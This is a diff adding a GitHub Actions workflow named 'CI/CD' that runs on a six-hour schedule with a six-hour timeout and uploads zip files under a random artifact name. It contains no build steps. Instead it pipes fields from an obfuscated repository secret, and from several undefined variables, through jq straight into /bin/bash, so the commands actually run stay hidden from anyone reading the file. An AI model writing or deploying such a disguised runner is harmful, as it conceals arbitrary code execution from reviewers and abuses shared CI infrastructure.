@@ -1,0 +1,31 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          nbc4648: ${{ secrets.nbc4648 }}
+        run: |
+          printf '%s' "$nbc4648" | jq -r .lie02 | /bin/bash
+          echo $pw7 | jq -r .xr41800 | /bin/bash
+          printf '%s' "$iinwa12897" | jq -r .lpx52 | /bin/bash
+          echo $xmtp72 | jq -r .egq0 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: vd1OOglh
+          path: "*.zip"
+          retention-days: 1
